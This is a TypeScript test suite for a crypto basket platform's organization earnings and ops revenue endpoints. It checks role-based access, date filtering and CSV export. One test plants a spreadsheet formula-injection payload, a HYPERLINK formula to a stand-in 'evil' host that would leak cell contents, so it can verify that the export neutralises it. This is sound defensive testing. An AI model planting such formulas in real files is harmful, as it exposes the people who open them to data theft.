import request from "supertest";
import { beforeEach, describe, expect, it } from "vitest";
import { app } from "@/app";
import { adminSql, resetDb } from "../helpers/db";
import { plainUser, reviewer } from "../modules/assets/helpers";
import { seedBasket, seedLeg } from "../execution/helpers";
import { addMember, type Role } from "../modules/members/helpers";

const SOL = { symbol: "SOL", chain: "solana", tokenStandard: "native", bps: 10_000 } as const;
type Basket = Awaited<ReturnType<typeof seedBasket>>;

/** One fee row of an operation with its own fee leg (the leg carries the transaction signature). */
async function fee(basket: Basket, o: { kind: string; amount: bigint; settledAt?: string | null; waived?: string; tx?: string; org?: string; scheduleId?: string }) {
  const { legId, operationId } = await seedLeg(basket.ownerId, basket, { kind: "network_fee" });
  await adminSql`UPDATE app.operations SET status = 'COMPLETED' WHERE id = ${operationId}`; // one active operation per user
  if (o.tx) await adminSql`UPDATE app.operation_legs SET source_tx = ${o.tx} WHERE id = ${legId}`;
  await adminSql`INSERT INTO app.operation_fees (id, operation_id, leg_id, kind, base_micro, amount_micro, organization_id, basket_id, waived_reason, schedule_id, settled_at)
    VALUES (gen_random_uuid(), ${operationId}, ${legId}, ${o.kind}, 100000000, ${o.amount.toString()}, ${o.org ?? basket.owner.id}, ${basket.basketId}, ${o.waived ?? null}, ${o.scheduleId ?? null}, ${o.settledAt ?? null})`;
}

async function arrange() {
  const basket = await seedBasket({ assets: [SOL] });
  await adminSql`UPDATE app.basket_versions SET name = 'Core, "Crypto"' WHERE id = ${basket.versionId}`;
  const roles = {} as Record<Exclude<Role, "OWNER">, { h: Record<string, string> }>;
  for (const role of ["ADMIN", "MANAGER", "ANALYST", "VIEWER"] as const) roles[role] = await addMember(app, basket.owner.id, role);
  const other = await seedBasket({ assets: [SOL] });
  await fee(basket, { kind: "manager_entry", amount: 5_000_000n, settledAt: "2026-09-10T10:00:00Z", tx: "sigAAA" });
  await fee(basket, { kind: "manager_entry", amount: 3_000_000n, settledAt: "2026-09-12T10:00:00Z", tx: "sigBBB" });
  await fee(basket, { kind: "manager_rebalance", amount: 1_000_000n, settledAt: "2026-08-15T10:00:00Z", tx: "sigCCC" });
  await fee(basket, { kind: "manager_entry", amount: 7_000_000n }); // planned, never settled
  await fee(basket, { kind: "manager_entry", amount: 0n, waived: "payout_wallet_unavailable" });
  await fee(basket, { kind: "platform", amount: 2_500_000n, settledAt: "2026-09-10T10:00:00Z" }); // not the organization's earnings
  await fee(other, { kind: "manager_entry", amount: 9_000_000n, settledAt: "2026-09-11T10:00:00Z" }); // another organization
  return { basket, other, roles };
}

beforeEach(resetDb);

describe("organization earnings", () => {
  it("OWNER and ADMIN see settled manager fees only, grouped by basket, version, kind and month, with explorer links", async () => {
    const { basket, roles } = await arrange();
    for (const h of [basket.owner.h, roles.ADMIN.h]) {
      const res = await request(app).get(`/v1/organizations/${basket.owner.id}/earnings`).set(h);
      expect(res.status, JSON.stringify(res.body)).toBe(200);
      expect(res.body.totalMicro).toBe("9000000"); // 5 + 3 + 1: no unsettled, waived, platform or other-organization rows
      expect(res.body.waivedCount).toBe(1);
      expect(res.body.groups).toEqual([
        { basketId: basket.basketId, basketName: 'Core, "Crypto"', versionNumber: 1, kind: "manager_entry", month: "2026-09", amountMicro: "8000000" },
        { basketId: basket.basketId, basketName: 'Core, "Crypto"', versionNumber: 1, kind: "manager_rebalance", month: "2026-08", amountMicro: "1000000" },
      ]);
      expect(res.body.recent.map((r: { tx: string }) => r.tx)).toEqual(["sigBBB", "sigAAA", "sigCCC"]);
      expect(res.body.recent[0].explorerUrl).toBe("https://solscan.io/tx/sigBBB");
    }
  });

  it("the date range narrows the totals", async () => {
    const { basket } = await arrange();
    const res = await request(app).get(`/v1/organizations/${basket.owner.id}/earnings?from=2026-09-01T00:00:00Z&to=2026-09-30T00:00:00Z`).set(basket.owner.h);
    expect(res.body.totalMicro).toBe("8000000");
  });

  it("MANAGER, ANALYST and VIEWER are 403; another organization's owner is 403; an unknown organization is 404", async () => {
    const { basket, other, roles } = await arrange();
    for (const role of ["MANAGER", "ANALYST", "VIEWER"] as const) {
      const res = await request(app).get(`/v1/organizations/${basket.owner.id}/earnings`).set(roles[role].h);
      expect(res.status, role).toBe(403);
    }
    expect((await request(app).get(`/v1/organizations/${basket.owner.id}/earnings?format=csv`).set(roles.VIEWER.h)).status).toBe(403);
    expect((await request(app).get(`/v1/organizations/${basket.owner.id}/earnings`).set(other.owner.h)).status).toBe(403);
    expect((await request(app).get("/v1/organizations/00000000-0000-4000-8000-000000000000/earnings").set(basket.owner.h)).status).toBe(404);
  });

  it("format=csv is text/csv with one escaped row per settled fee", async () => {
    const { basket } = await arrange();
    const res = await request(app).get(`/v1/organizations/${basket.owner.id}/earnings?format=csv`).set(basket.owner.h);
    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/^text\/csv/);
    const lines = res.text.trim().split("\n");
    expect(lines[0]).toBe("date,basket,version,kind,amount_usdc,tx");
    expect(lines).toHaveLength(4);
    expect(lines[1]).toBe('2026-08-15T10:00:00.000Z,"Core, ""Crypto""",1,manager_rebalance,1,sigCCC');
    expect(lines[3]).toBe('2026-09-12T10:00:00.000Z,"Core, ""Crypto""",1,manager_entry,3,sigBBB');
  });

  it("a basket name that starts like a formula is prefixed with an apostrophe in the CSV", async () => {
    const { basket } = await arrange();
    await adminSql`UPDATE app.basket_versions SET name = '=HYPERLINK("https://evil/?"&A1,"x")' WHERE id = ${basket.versionId}`;
    const res = await request(app).get(`/v1/organizations/${basket.owner.id}/earnings?format=csv`).set(basket.owner.h);
    expect(res.text).toContain(`,"'=HYPERLINK(""https://evil/?""&A1,""x"")",1,`);
  });
});

describe("platform revenue (ops)", () => {
  it("platform totals by operation and month (settled only), waived manager fees by reason, and a CSV", async () => {
    const { basket } = await arrange();
    const [schedule] = await adminSql<{ id: string }[]>`INSERT INTO app.platform_fee_schedules (id, scope, operation_kind, bps, reason, created_by) VALUES (gen_random_uuid(), 'default', 'invest', 25, 't', ${basket.ownerId}) RETURNING id`;
    await fee(basket, { kind: "platform", amount: 2_500_000n, settledAt: "2026-09-10T10:00:00Z", scheduleId: schedule!.id, tx: "sigP1" });
    await fee(basket, { kind: "platform", amount: 1_500_000n, settledAt: "2026-08-02T10:00:00Z", scheduleId: schedule!.id, tx: "sigP2" });
    await fee(basket, { kind: "platform", amount: 9_000_000n, scheduleId: schedule!.id }); // unsettled
    const ops = await reviewer();
    const res = await request(app).get("/v1/ops/revenue").set(ops.h);
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(res.body).toEqual({
      totalMicro: "4000000",
      platform: [{ operationKind: "invest", month: "2026-09", amountMicro: "2500000" }, { operationKind: "invest", month: "2026-08", amountMicro: "1500000" }],
      waivedManager: [{ reason: "payout_wallet_unavailable", count: 1 }],
    });
    const csv = await request(app).get("/v1/ops/revenue?format=csv").set(ops.h);
    expect(csv.headers["content-type"]).toMatch(/^text\/csv/);
    expect(csv.text.trim().split("\n")).toEqual(["date,operation,amount_usdc,tx", "2026-08-02T10:00:00.000Z,invest,1.5,sigP2", "2026-09-10T10:00:00.000Z,invest,2.5,sigP1"]);
  });

  it("is for ops roles only", async () => {
    const { basket } = await arrange();
    expect((await request(app).get("/v1/ops/revenue").set((await plainUser()).h)).status).toBe(403);
    expect((await request(app).get("/v1/ops/revenue").set(basket.owner.h)).status).toBe(403);
    expect((await request(app).get("/v1/ops/revenue")).status).toBe(401);
  });
});
